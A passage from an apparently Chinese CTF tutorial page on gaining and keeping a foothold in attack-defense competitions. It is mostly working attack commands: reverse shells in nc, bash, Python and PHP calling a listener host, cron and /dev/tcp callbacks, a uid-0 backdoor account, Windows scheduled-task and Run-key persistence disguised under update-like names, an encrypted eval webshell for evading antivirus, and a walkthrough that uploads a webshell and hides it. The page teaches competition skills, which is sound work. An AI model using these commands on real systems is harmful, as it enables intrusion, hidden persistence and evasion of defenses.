+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>nc<span class="w"> </span><span class="m">10</span>.0.0.1<span class="w"> </span><span class="m">4444</span><span class="w"> </span>-e<span class="w"> </span>/bin/bash
+</code></pre></div>
+<p><code>-e</code> 让 nc 在建立连接后执行程序。但很多发行版装的是 OpenBSD 版 nc，<strong>没有 <code>-e</code> 选项</strong>，这时用命名管道绕：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>rm<span class="w"> </span>/tmp/f<span class="p">;</span><span class="w"> </span>mkfifo<span class="w"> </span>/tmp/f<span class="p">;</span><span class="w"> </span>cat<span class="w"> </span>/tmp/f<span class="w"> </span><span class="p">|</span><span class="w"> </span>/bin/bash<span class="w"> </span>-i<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>nc<span class="w"> </span><span class="m">10</span>.0.0.1<span class="w"> </span><span class="m">4444</span><span class="w"> </span>&gt;<span class="w"> </span>/tmp/f
+</code></pre></div>
+<p>原理：<code>mkfifo</code> 建一个管道文件，<code>nc</code> 的输出写进管道，<code>cat</code> 从管道读出喂给 bash，bash 的输出再经管道送回 nc——用一个文件把两条方向相反的流接成环。</p>
+<h3 id="python">python 版<a class="headerlink" href="#python" title="Permanent link">¶</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'</span>
+</code></pre></div>
+<p>核心是三次 <code>os.dup2</code>：把 socket 的文件描述符复制到 0/½（stdin/stdout/stderr），这样随后启动的 bash 读写的就是网络连接。目标上有 python 时这是最通用的一条。</p>
+<h3 id="php">php 版<a class="headerlink" href="#php" title="Permanent link">¶</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="x">php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span>
+</code></pre></div>
+<p><code>fsockopen</code> 返回的流在 PHP CLI 下对应文件描述符 3，于是用 <code>&lt;&amp;3 &gt;&amp;3 2&gt;&amp;3</code> 把 bash 的三个标准流接到这个 socket 上。在只有 web 环境、命令执行点就是 PHP 的场景里很顺手。</p>
+<p>收到连接的标志：监听端终端出现 <code>connect to [10.0.0.1] from target</code> 并出现一个新的提示符。</p>
+<h2 id="_6">权限维持基础<a class="headerlink" href="#_6" title="Permanent link">¶</a></h2>
+<p>立足点会被重启、被清理、被对手（AWD 里）删掉。权限维持的目标是：<strong>即使 webshell 被删，也能再拿回来</strong>。每种给一两条够用的即可。</p>
+<h3 id="linuxcron">Linux：cron 计划任务<a class="headerlink" href="#linuxcron" title="Permanent link">¶</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="c1"># 每分钟反弹一次 shell，简单粗暴</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">'* * * * * root bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1'</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/crontab
+</code></pre></div>
+<p>或者写到用户自己的 crontab（<code>crontab -e</code> 或 <code>/var/spool/cron/&lt;user&gt;</code>）。注意 root 身份写入 <code>/etc/crontab</code> 时需要带上用户名字段，个人 crontab 则不需要。</p>
+<h3 id="linux">Linux：后门用户<a class="headerlink" href="#linux" title="Permanent link">¶</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="c1"># 添加一个 uid=0 的用户，效果等同于 root</span>
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>useradd<span class="w"> </span>-o<span class="w"> </span>-u<span class="w"> </span><span class="m">0</span><span class="w"> </span>-g<span class="w"> </span><span class="m">0</span><span class="w"> </span>-M<span class="w"> </span>-s<span class="w"> </span>/bin/bash<span class="w"> </span>backdoor
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">'backdoor:Passw0rd'</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>chpasswd
+</code></pre></div>
+<p><code>-o</code> 允许 uid 重复（与 root 同为 0），<code>-M</code> 不建家目录。配合 <code>passwd</code> 里的记录可以直接 SSH 登录。更隐蔽一点的做法是往 <code>/root/.ssh/authorized_keys</code> 里塞自己的公钥。</p>
+<h3 id="windows">Windows：计划任务<a class="headerlink" href="#windows" title="Permanent link">¶</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="n">schtasks</span> <span class="p">/</span><span class="n">create</span> <span class="p">/</span><span class="n">tn</span> <span class="s2">"WindowsUpdateCheck"</span> <span class="p">/</span><span class="nb">sc </span><span class="n">minute</span> <span class="p">/</span><span class="n">mo</span> <span class="n">5</span> <span class="p">/</span><span class="n">tr</span> <span class="s2">"C:\Windows\Temp\rev.exe"</span> <span class="p">/</span><span class="n">ru</span> <span class="n">SYSTEM</span>
+</code></pre></div>
+<p>每 5 分钟以 SYSTEM 权限运行一次指定程序。<code>schtasks</code> 是内置命令，不需要额外落地工具。</p>
+<h3 id="windows_1">Windows：启动项<a class="headerlink" href="#windows_1" title="Permanent link">¶</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="n">reg</span> <span class="n">add</span> <span class="s2">"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"</span> <span class="p">/</span><span class="n">v</span> <span class="s2">"OneDriveSync"</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_SZ</span> <span class="p">/</span><span class="n">d</span> <span class="s2">"C:\Users\Public\rev.exe"</span>
+</code></pre></div>
+<p>当前用户登录时自动执行。写 <code>HKLM</code> 下的同名键则对所有用户生效（需要管理员权限）。</p>
+<h3 id="_7">一点取舍<a class="headerlink" href="#_7" title="Permanent link">¶</a></h3>
+<p>权限维持的核心矛盾是 <strong>持久性和隐蔽性不可兼得</strong>：cron 每分钟反弹最可靠也最吵。够用即止的原则下，先想清楚"我需要它活多久"——AWD 一轮可能只有几分钟，一条 cron 就够；真实渗透才需要考虑多手段冗余。</p>
+<h2 id="_8">免杀基础概念<a class="headerlink" href="#_8" title="Permanent link">¶</a></h2>
+<h3 id="_9">杀软在查什么<a class="headerlink" href="#_9" title="Permanent link">¶</a></h3>
+<p>主流查杀分两类：</p>
+<ul>
+<li><strong>静态查杀</strong>：不运行文件，直接看内容。最基础的是 <strong>特征码匹配</strong>——杀软厂商给已知恶意文件提取一段字节序列（或哈希）作为"指纹"，文件里出现这段指纹就报警。进阶一点的是启发式检测：看到 <code>eval(base64_decode(...))</code> 这种高危函数组合就判定可疑。</li>
+<li><strong>动态查杀</strong>：把文件放进沙箱里跑，观察行为（连了哪些 IP、改了哪些注册表、注入了什么进程），行为恶意才报警。</li>
+</ul>
+<p>CTF 里遇到的"查杀"绝大多数是静态特征码层面（比如比赛方的 webshell 查杀脚本），所以重点讲静态免杀。</p>
+<h3 id="_10">静态免杀的思路<a class="headerlink" href="#_10" title="Permanent link">¶</a></h3>
+<p>特征码匹配的本质是"你的文件里有一段和库里一样的字节"。那绕过思路就只有两个方向：</p>
+<ol>
+<li><strong>改变字节，不改变功能</strong>。变量名混淆、注释插入、等价语法替换（<code>eval</code> → <code>assert</code> → 回调函数 <code>call_user_func</code>）、字符串拼接拆分（<code>'ev'.'al'</code>）。</li>
+<li><strong>让恶意部分不出现在文件里，运行时再造出来</strong>。典型做法是把真正的 payload 加密/编码后存进文件，运行时解密执行：</li>
+</ol>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="nv">$key</span> <span class="o">=</span> <span class="s2">"k"</span><span class="p">;</span>
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="nv">$payload</span> <span class="o">=</span> <span class="nb">openssl_decrypt</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'p'</span><span class="p">],</span> <span class="s2">"AES-128-ECB"</span><span class="p">,</span> <span class="nv">$key</span><span class="p">);</span>
+<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="k">eval</span><span class="p">(</span><span class="nv">$payload</span><span class="p">);</span>   <span class="c1">// 文件本身不含任何恶意代码明文</span>
+<a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="cp">?&gt;</span>
+</code></pre></div>
+<p>这其实就是冰蝎 shell 的基本结构——加密除了防流量审计，顺带也做了静态免杀。</p>
+<p>够用的结论：CTF 场景下，把一句话换成"异或/拼接 + 动态函数名"的写法，基本就能过掉比赛里的特征码查杀脚本；不要试图手工对抗真正的商业杀软，那是另一个专业领域。</p>
+<h2 id="ctf-awd">CTF 实战：AWD 中的一轮完整流程<a class="headerlink" href="#ctf-awd" title="Permanent link">¶</a></h2>
+<p>AWD（Attack With Defense）赛制里，每支队伍维护一台有漏洞的靶机，既要打别人拿 flag，也要防别人打自己。立足点建立在这里是核心动作。走一遍典型流程：</p>
+<h3 id="_11">第一步：用已知漏洞写入一句话<a class="headerlink" href="#_11" title="Permanent link">¶</a></h3>
+<p>假设通过赛前审计已知靶机有文件上传点（参考「文件上传」一章的绕过手法），上传 <code>shell.php</code>：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="cp">&lt;?php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span> <span class="cp">?&gt;</span>
+</code></pre></div>
+<p>验证可用：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>curl<span class="w"> </span>-d<span class="w"> </span><span class="s1">'cmd=system("id");'</span><span class="w"> </span>http://192.168.1.10/uploads/shell.php
+</code></pre></div>
+<h3 id="shell_1">第二步：立刻换成冰蝎 shell<a class="headerlink" href="#shell_1" title="Permanent link">¶</a></h3>
+<p>明文一句话在 AWD 里是大忌——防守方能从流量里看到你的命令，直接把 shell 复制走打别人。通过一句话写入冰蝎的 <code>shell.php</code>（用蚁剑文件管理上传，或 <code>file_put_contents</code> 写），然后冰蝎客户端连接，后续操作全部走加密通道。</p>
+<h3 id="flag">第三步：拿 flag 并留后门<a class="headerlink" href="#flag" title="Permanent link">¶</a></h3>
+<p>AWD 的 flag 通常在固定路径，如 <code>/flag</code>。读到 flag 提交得分后，立即写权限维持：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">'* * * * * www-data bash -c "bash -i &gt;&amp; /dev/tcp/192.168.1.100/4444 0&gt;&amp;1"'</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/crontab
+</code></pre></div>
+<p>同时把 webshell 藏到深路径、改成不起眼的文件名，比如 <code>/var/www/html/assets/fonts/.cache.php</code>。</p>
+<h3 id="_12">第四步：防守侧的对应动作<a class="headerlink" href="#_12" title="Permanent link">¶</a></h3>
+<p>立足点建立的反面就是查杀。自己队伍要定期：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="c1"># 找出最近被改动的 php 文件，大概率是对手刚传的 shell</span>
+<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>find<span class="w"> </span>/var/www<span class="w"> </span>-name<span class="w"> </span><span class="s2">"*.php"</span><span class="w"> </span>-mmin<span class="w"> </span>-5
+<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="c1"># 看有没有可疑 cron</span>
+<a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>crontab<span class="w"> </span>-l<span class="p">;</span><span class="w"> </span>cat<span class="w"> </span>/etc/crontab
+</code></pre></div>
+<h3 id="_13">取舍建议<a class="headerlink" href="#_13" title="Permanent link">¶</a></h3>
+<ul>
+<li><strong>webshell</strong>：普通积分赛（Jeopardy）的 web 题多数只需要一次性命令执行，curl + 一句话足矣，不必上管理器；AWD 必须加密 shell。</li>
+<li><strong>反弹 shell</strong>：需要翻文件、跑交互程序时才反弹；只读个 flag 不值得。端口选常见高位端口（4444、8888），避免被防火墙只放行 80/443 的策略拦掉。</li>
+<li><strong>权限维持</strong>：Jeopardy 完全不需要。AWD 里一两条 cron 就够，写太多反而容易被对手的查杀脚本扫到特征。</li>
+<li><strong>免杀</strong>：只在确认对方有查杀时再做，先 xor 拼接试一手，不要一上来就写复杂加载器。</li>
+</ul>
+<p>一句话总结本章：<strong>先用最小成本确认立足点（一句话），再用加密通道巩固它（冰蝎/哥斯拉），需要交互就反弹 shell，赛制要求持久就留后门，被查杀了才做免杀</strong>。</p></div>
+
+<!-- Source file information -->
+
+
+<!-- Was this page helpful? -->
+
+  
+
+
+
+
+<!-- Previous and next pages link -->
+<nav
+class="md-footer__inner md-grid"
+aria-label="页脚"
+
+>
+
+<!-- Link to previous page -->
+
+  
+  <a
+    href="../two_layer/"
+    class="md-footer__link md-footer__link--prev"
+    aria-label="上一页: 两层网络实战"
+    rel="prev"
+  >
+    <div class="md-footer__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+    </div>
+    <div class="md-footer__title">
+      <span class="md-footer__direction">
+        上一页
+      </span>
+      <div class="md-ellipsis">
+        两层网络实战
+      </div>
+    </div>
+  </a>
+
+
+<!-- Link to next page -->
+
+  
+  <a
+    href="../internal_recon/"
+    class="md-footer__link md-footer__link--next"
+    aria-label="下一页: 内网信息收集"
+    rel="next"
+  >
+    <div class="md-footer__title">
+      <span class="md-footer__direction">
+        下一页
+      </span>
+      <div class="md-ellipsis">
+        内网信息收集
+      </div>
+    </div>
+    <div class="md-footer__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+    </div>
+  </a>
+
+</nav>
+
+<!-- Comment system -->
+
+  <h2 id="__comments">评论</h2>
+
+  <!-- giscus：主题与外壳 hc-theme 同步（初始 + 切换时 postMessage） -->
+  <script src="https://giscus.app/client.js"
+    data-repo="ProbiusOfficial/Hello-CTF"
+    data-repo-id="R_kgDOJXX6hg"
+    data-category="Show and tell"
+    data-category-id="DIC_kwDOJXX6hs4CXmuV"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="top"
+    data-theme="light"
+    data-lang="zh-CN"
+    crossorigin="anonymous"
+    async>
+  </script>
+  <script>
+    (function () {
+      var script = document.querySelector("script[src*=giscus]");
+      function currentTheme() {
+        var t = null;
+        try { t = localStorage.getItem("hc-theme"); } catch (e) {}
+        return t === "dark" ? "dark" : "light";
+      }
+      /* 初始主题：giscus 加载前写入 data-theme */
+      script.setAttribute("data-theme", currentTheme());
+      /* 外壳主题切换 → 通知 giscus iframe 换肤（由 shell.js 广播 hc-theme-change） */
+      document.addEventListener("hc-theme-change", function (e) {
+        var theme = e.detail === "dark" ? "dark" : "light";
+        var iframe = document.querySelector("iframe.giscus-frame");
+        if (iframe) {
+          iframe.contentWindow.postMessage(
+            { giscus: { setConfig: { theme: theme } } },
+            "https://giscus.app"
+          );
+        }
+      });
+    })();
+  </script>
+
+  <!-- 评论区显示优化 -->
+  <style>
+    #__comments {
+      margin-top: 2.2rem;
+      padding-top: 1.2rem;
+      border-top: 1px solid var(--line, #e6eaf1);
+      font-size: 1rem;
+    }
+    .giscus, .giscus-frame { width: 100%; }
+    .giscus-frame { border: none; color-scheme: light; }
+    [data-md-color-scheme="slate"] .giscus-frame { color-scheme: dark; }
+  </style>
+
+
+<!-- 才懒得给你加空格呢 给你塞个 Pangu.js 哼！ -->
+<head>
+  <script src="https://cdn.jsdelivr.net/npm/pangu.simple@1.0.5/dist/browser/pangu.js"></script>
+  <script>
+    pangu.spacingPage();
+  </script>
+</head>
+      </article>
+      
+        <aside class="hc-toc">
+          <div class="hc-toc-cap">ON THIS PAGE</div>
+          
+  <ul>
+    
+      <li>
+        <a href="#_1">立足点建立</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#webshell">Webshell 落地</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#_2">一句话木马</a>
+        
+      </li>
+    
+      <li>
+        <a href="#behinder">冰蝎（Behinder）</a>
+        
+      </li>
+    
+      <li>
+        <a href="#godzilla">哥斯拉（Godzilla）</a>
+        
+      </li>
+    
+      <li>
+        <a href="#antsword">蚁剑（AntSword）</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_3">怎么选</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+      <li>
+        <a href="#shell">反弹 Shell</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#_4">为什么需要反弹</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_5">监听端配置</a>
+        
+      </li>
+    
+      <li>
+        <a href="#bash">bash 版</a>
+        
+      </li>
+    
+      <li>
+        <a href="#nc">nc 版</a>
+        
+      </li>
+    
+      <li>
+        <a href="#python">python 版</a>
+        
+      </li>
+    
+      <li>
+        <a href="#php">php 版</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+      <li>
+        <a href="#_6">权限维持基础</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#linuxcron">Linux：cron 计划任务</a>
+        
+      </li>
+    
+      <li>
+        <a href="#linux">Linux：后门用户</a>
+        
+      </li>
+    
+      <li>
+        <a href="#windows">Windows：计划任务</a>
+        
+      </li>
+    
+      <li>
+        <a href="#windows_1">Windows：启动项</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_7">一点取舍</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+      <li>
+        <a href="#_8">免杀基础概念</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#_9">杀软在查什么</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_10">静态免杀的思路</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+      <li>
+        <a href="#ctf-awd">CTF 实战：AWD 中的一轮完整流程</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#_11">第一步：用已知漏洞写入一句话</a>
+        
+      </li>
+    
+      <li>
+        <a href="#shell_1">第二步：立刻换成冰蝎 shell</a>
+        
+      </li>
+    
+      <li>
+        <a href="#flag">第三步：拿 flag 并留后门</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_12">第四步：防守侧的对应动作</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_13">取舍建议</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+  </ul>
+
+      </li>
+    
+  </ul>
+
+        </aside>
+      
+    </div>
+    <footer class="hc-footer">
+      <span>© 2026 探姬 · Hello CTF</span>
+      <span class="links">
+        <a href="https://github.com/ProbiusOfficial/Hello-CTF" target="_blank" rel="noopener">GitHub</a>
+        <a href="https://github.com/ProbiusOfficial/Hello-CTF/pulls" target="_blank" rel="noopener">参与共建</a>
+        <a href="../../sidebar/feedback.html">反馈与群聊</a>
+      </span>
+    </footer>
+  </div>
+
+  <!-- 站点原有 extra_javascript（baidu_SEO / katex / statis / FullCalendar 等） -->
+  
+    <script src="../../javascripts/baidu_SEO.js"></script>
+  
+    <script src="../../javascripts/katex.js"></script>
+  
+    <script src="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.js"></script>
+  
+    <script src="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/contrib/auto-render.min.js"></script>
+  
+    <script src="../../javascripts/statis.js"></script>
+  
+    <script src="../../javascripts/FullCalendar.js"></script>
+  
+    <script src="../../shell/feedback-widget.js"></script>
+  
+
+  <!-- mermaid（material bundle 移除后自行加载） -->
+  <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      if (!window.mermaid) return;
+      document.querySelectorAll("pre.mermaid").forEach(function (el) {
+        var div = document.createElement("div");
+        div.className = "mermaid";
+        div.textContent = el.textContent;
+        el.replaceWith(div);
+      });
+      try {
+        mermaid.initialize({ startOnLoad: false, theme: "neutral" });
+        mermaid.run({ querySelector: ".mermaid" });
+      } catch (e) {}
+    });
+  </script>
+
+  <!-- 代码复制按钮（material bundle 移除后自实现） -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      document.querySelectorAll(".md-typeset pre").forEach(function (pre) {
+        if (pre.querySelector(".hc-copy") || pre.classList.contains("mermaid")) return;
+        var btn = document.createElement("button");
+        btn.className = "hc-copy";
+        btn.textContent = "复制";
+        btn.onclick = function () {
+          var text = pre.innerText.replace(/^复制\n/, "");
+          navigator.clipboard.writeText(text).then(function () {
+            btn.textContent = "已复制";
+            setTimeout(function () { btn.textContent = "复制"; }, 1500);
+          });
+        };
+        pre.appendChild(btn);
+      });
+    });
+  </script>
+
+  <!-- TOC 滚动高亮 -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      var links = Array.from(document.querySelectorAll(".hc-toc a"));
+      if (!links.length) return;
+      var map = links.map(function (a) {
+        var el = document.getElementById(decodeURIComponent(a.getAttribute("href").slice(1)));
+        return el ? { a: a, el: el } : null;
+      }).filter(Boolean);
+      function spy() {
+        var current = null;
+        map.forEach(function (m) { if (m.el.getBoundingClientRect().top <= 80) current = m; });
+        links.forEach(function (a) { a.classList.remove("on"); });
+        if (current) current.a.classList.add("on");
+      }
+      document.addEventListener("scroll", spy, { passive: true });
+      spy();
+    });
+  </script>
+
+  <!-- 顶部导航下拉：fixed 定位避开 overflow 裁剪 -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      document.querySelectorAll(".tn-item").forEach(function (item) {
+        var drop = item.querySelector(".tn-drop");
+        if (!drop) return;
+        item.addEventListener("mouseenter", function () {
+          var r = item.getBoundingClientRect();
+          drop.style.top = r.bottom + "px";
+          var left = Math.min(r.left, window.innerWidth - 240);
+          drop.style.left = Math.max(10, left) + "px";
+        });
+      });
+    });
+  </script>
+
+  
+</body>
+</html>
